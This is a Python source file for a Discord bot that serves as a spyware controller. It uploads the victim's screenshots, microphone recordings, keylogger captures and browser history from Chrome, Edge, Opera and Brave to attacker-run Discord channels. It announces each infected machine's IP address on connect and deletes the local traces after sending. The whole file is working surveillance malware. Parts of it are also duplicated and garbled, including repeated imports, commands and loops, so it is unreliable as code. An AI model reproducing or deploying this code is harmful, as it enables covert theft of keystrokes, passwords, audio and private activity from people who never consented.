import discord, time, os, socket
from discord import app_commands
from discord.ext import commands, tasks
from history_finder import SearchHistory
from discord import app_commands
from discord.ext import commands, tasks
from history_finder import SearchHistory
from screen import Screenshot, Microphone
from dotenv import load_dotenv
load_dotenv(".env")

keylogs_file = "files\\keys.txt"
bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())

guild_id = os.getenv('SERVER_ID')
screenshot_channel = os.getenv('SCREENSHOT_CHANNEL_ID')
microphone_channel = os.getenv('MICROPHONE_CHANNEL_ID')
logger_channel = os.getenv('LOGGER_CHANNEL_ID')
commands_channel = os.getenv('COMMANDS_CHANNEL_ID')
connect_channel = os.getenv('STATUS_CHANNEL_ID')

searchhistory = SearchHistory()
microphone = Microphone()
screenshot = Screenshot()  

async def sendMic(ctx):
    for file in os.listdir("files"):
        if file.endswith(".wav"):
            mic_path = f"files\\{file}"

            if not mic_path:
                print("Microphone path is empty.")
                return

            guild = await bot.fetch_guild(guild_id)
            channel = await guild.fetch_channel(microphone_channel)

            with open(mic_path, 'rb') as mic_file:
                await channel.send(file=discord.File(mic_file, mic_path))
 
            os.remove(mic_path)
            time.sleep(0.1)

async def sendScreen(ctx):
    for file in os.listdir("files"):
        if file.endswith(".png"):
            screenshot_path = f"files\\{file}"

            if not screenshot_path:
                print("Screenshot path is empty.")
                return

            guild = await bot.fetch_guild(guild_id)
            channel = await guild.fetch_channel(screenshot_channel)

            with open(screenshot_path, 'rb') as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, screenshot_path)) 

            os.remove(screenshot_path)
            time.sleep(0.1)

async def sendLogs(ctx):
    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(logger_channel)

    with open(keylogs_file, 'rb') as logs_file:
        await channel.send(file=discord.File(logs_file, keylogs_file)) 

    with open(keylogs_file, "w") as f:
        f.write("")
            
@bot.tree.command(name="gethistory", description="Send search history from different browsers")
async def get_history(interaction: discord.Interaction, browser: str, days: int):
    try:
        browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
        if browser.lower() in browsers:
            if browser.lower() == "chrome" or browser.lower() == "google":
                result, browser = searchhistory.get_chrome()
            if browser.lower() == "edge" or browser.lower() == "microsoft edge":
                result, browser = searchhistory.get_edge()
            if browser.lower() == "opera" or browser.lower() == "opera gx":
                result, browser = searchhistory.get_opera()
            if browser.lower() == "brave":
                result, browser = searchhistory.get_brave()

            guild = await bot.fetch_guild(guild_id)
            channel = await guild.fetch_channel(commands_channel)

            with open(browser, 'rb') as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, browser))

        if browser.lower() == "all":
            result = searchhistory.get_all()
            await interaction.response.send_message(result)
        else:
            await interaction.response.send_message("Invalid Browser, Try one of these:\n>>> Chrome/Google\nBrave\nOpera/Opera GX\nEdge/Microsoft Edge")
    except Exception as e:
        print(f"YOU FUCKED UP!!!\n{e}")

@tasks.loop(seconds=0.1)
async def check_files(ctx):
    while True:
        for file in os.listdir("files"):
            if file.endswith(".png"):
                await sendScreen(ctx=ctx)
            if file.endswith(".wav"):
                await sendMic(ctx=ctx)
            with open(keylogs_file, "r") as f:
                logs = f.readlines()
                for lines in logs:
                    if "SEC: 5" in lines:
                        await sendLogs(ctx=ctx)

            
@bot.tree.command(name="gethistory", description="Send search history from different browsers")
async def get_history(interaction: discord.Interaction, browser: str, days: int):
    try:
        browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
        if browser.lower() in browsers:
            if browser.lower() == "chrome" or browser.lower() == "google":
                result, browser = searchhistory.get_chrome()
            if browser.lower() == "edge" or browser.lower() == "microsoft edge":
                result, browser = searchhistory.get_edge()
            if browser.lower() == "opera" or browser.lower() == "opera gx":
                result, browser = searchhistory.get_opera()
            if browser.lower() == "brave":
                result, browser = searchhistory.get_brave()

            guild = await bot.fetch_guild(guild_id)
            channel = await guild.fetch_channel(commands_channel)

            with open(browser, 'rb') as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, browser))

        if browser.lower() == "all":
            result = searchhistory.get_all()
            await interaction.response.send_message(result)
        else:
            await interaction.response.send_message("Invalid Browser, Try one of these:\n>>> Chrome/Google\nBrave\nOpera/Opera GX\nEdge/Microsoft Edge")
    except Exception as e:
        print(f"YOU FUCKED UP!!!\n{e}")

@tasks.loop(seconds=0.1)
async def check_files(ctx):
    while True:
        for file in os.listdir("files"):
            if file.endswith(".png"):
                await sendScreen(ctx=ctx)
            if file.endswith(".wav"):
                await sendMic(ctx=ctx)
            with open(keylogs_file, "r") as f:
                logs = f.readlines()
                for lines in logs:
                    if "SEC: 5" in lines:
                        await sendLogs(ctx=ctx)

@bot.event
async def on_ready():
    e = await bot.tree.sync()
    print(e)
    e = await bot.tree.sync()
    print(e)
    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(connect_channel)

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    await channel.send(f"{ip_address} connected at {time.strftime('%m/%d %H:%M:%S')}")
    check_files.start(guild)
    check_files.start(guild)

@bot.event
async def on_message(message):
    if not message.author.bot:
        await bot.process_commands(message)

bot.run(os.getenv("TOKEN"))